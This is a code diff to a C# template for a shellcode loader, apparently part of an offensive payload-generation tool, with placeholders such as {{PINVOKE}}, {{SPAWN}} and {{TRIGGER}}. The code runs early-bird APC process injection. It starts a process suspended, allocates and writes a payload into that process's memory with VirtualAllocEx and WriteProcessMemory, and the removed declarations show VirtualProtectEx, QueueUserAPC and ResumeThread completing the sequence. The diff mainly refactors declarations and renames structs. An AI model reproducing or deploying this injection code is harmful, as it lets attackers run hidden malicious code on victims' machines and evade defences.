@@ -133,36 +133,15 @@ namespace {{NAMESPACE}}
 {
     class Program
     {
-        [DllImport(""kernel32.dll"", CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Auto)]
-        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SecurityAttributes lpProcessAttributes, ref SecurityAttributes lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment,
-        string lpCurrentDirectory, [In] ref StartuprocInfo lpStartuprocInfo, out ProcessInfo lpProcessInformation);
 
-        [DllImport(""kernel32.dll"", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
-
-        [DllImport(""kernel32.dll"")]
-        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
-
-        [DllImport(""kernel32.dll"", SetLastError = true)]
-        static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, int dwThreadId);
-
-        [DllImport(""kernel32.dll"")]
-        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
-
-        [DllImport(""kernel32.dll"", SetLastError = true)]
-        public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
-
-        [DllImport(""kernel32.dll"", SetLastError = true)]
-        static extern uint ResumeThread(IntPtr hThread);
-
-
+        {{PINVOKE}}
 
         #region Types
 
         #region CreateProcess Types
 
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
-        public struct ProcessInfo
+        public struct PROCESS_INFORMATION
         {
             public IntPtr hProcess;
             public IntPtr hThread;
@@ -179,7 +158,7 @@ namespace {{NAMESPACE}}
         }
 
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
-        public struct StartuprocInfo
+        public struct STARTUPINFO
         {
             public uint cb;
             public string lpReserved;
@@ -253,8 +232,8 @@ namespace {{NAMESPACE}}
         {
             {{TRIGGER}}
             {{MODE}}
-            StartuprocInfo sInfo = new StartuprocInfo();
-            ProcessInfo procInfo;
+            STARTUPINFO sInfo = new STARTUPINFO();
+            PROCESS_INFORMATION procInfo;
             SecurityAttributes processSec = new SecurityAttributes();
             SecurityAttributes threadSec = new SecurityAttributes();
             processSec.length = Marshal.SizeOf(processSec);
@@ -262,7 +241,7 @@ namespace {{NAMESPACE}}
 
             if (CreateProcess( {{SPAWN}}, null, ref processSec, ref threadSec, false, 0x00000004, IntPtr.Zero, null, ref sInfo, out procInfo)) //0x00000004 == CreateSuspended
             {
-                IntPtr baseAddress = VirtualAllocEx(procInfo.hProcess, IntPtr.Zero, payload.Length, AllocationType.Commit, MemoryProtection.ReadWrite);
+                IntPtr baseAddress = VirtualAllocEx(procInfo.hProcess, IntPtr.Zero, (uint)payload.Length, (uint)AllocationType.Commit, (uint)MemoryProtection.ReadWrite);
                 if (baseAddress == null)
                 {
                     Console.WriteLine(""[!] VirtualAllocEx: {0}"", Marshal.GetLastWin32Error().ToString());
@@ -270,7 +249,7 @@ namespace {{NAMESPACE}}
                     Environment.Exit(0);
                 }
                 IntPtr BytesWritten;
-                WriteProcessMemory(procInfo.hProcess, baseAddress, payload, payload.Length, out BytesWritten);
+                WriteProcessMemory(procInfo.hProcess, baseAddress, payload, (uint)payload.Length, out BytesWritten);
 
                 if (BytesWritten == IntPtr.Zero)
                 {
